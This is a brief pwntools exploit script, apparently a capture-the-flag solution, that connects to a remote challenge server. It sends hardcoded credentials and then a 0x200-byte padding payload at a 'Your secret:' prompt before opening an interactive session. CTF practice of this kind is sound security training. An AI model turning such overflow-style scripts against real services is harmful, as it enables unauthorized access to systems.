from pwn import *
context.log_level       = "DEBUG"
context.arch            = "amd64"
#p = process("./cat")
p = remote('159.89.197.210', 9994)
#gdb.attach(p,api=True)

user_name = b"KCSC_4dm1n1str4t0r"
passwd = b"wh3r3_1s_th3_fl4g"
p.send( b"KCSC_4dm1n1str4t0r")
p.send(b"wh3r3_1s_th3_fl4g")
payload = b"a"*0x200
p.sendlineafter(b"Your secret: ",payload)
p.interactive()

